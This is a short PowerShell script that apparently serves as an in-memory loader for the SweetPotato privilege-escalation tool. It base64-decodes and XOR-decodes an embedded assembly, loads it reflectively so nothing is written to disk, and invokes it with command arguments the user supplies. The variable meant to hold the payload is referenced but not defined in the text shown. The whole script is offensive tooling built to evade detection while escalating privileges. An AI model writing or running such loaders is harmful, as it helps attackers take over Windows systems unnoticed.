function Load-XLdr_SweetPotato { param([Parameter ()] $xk = "0x6d")
$loadedAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Fullname -eq "SweetPotato, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" }
if ($loadedAssembly) {
  return $loadedAssembly[0]  
}
$xk -eq "" -and ($xk = Read-Host "Specify XorKey")
$fb = [Convert]::FromBase64String($02701925)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor $xk}
$asm_XLdr_SweetPotato = [System.Reflection.Assembly]::Load($fb)
return $asm_XLdr_SweetPotato
}
function Invoke-XLdr_SweetPotato { param([Parameter ()] $Params = "")
$asm = Load-XLdr_SweetPotato
$Params -eq "" -and ($Params = Read-Host "Specify command arguments")
$asm.EntryPoint.Invoke($null, (, $Params.split()))
}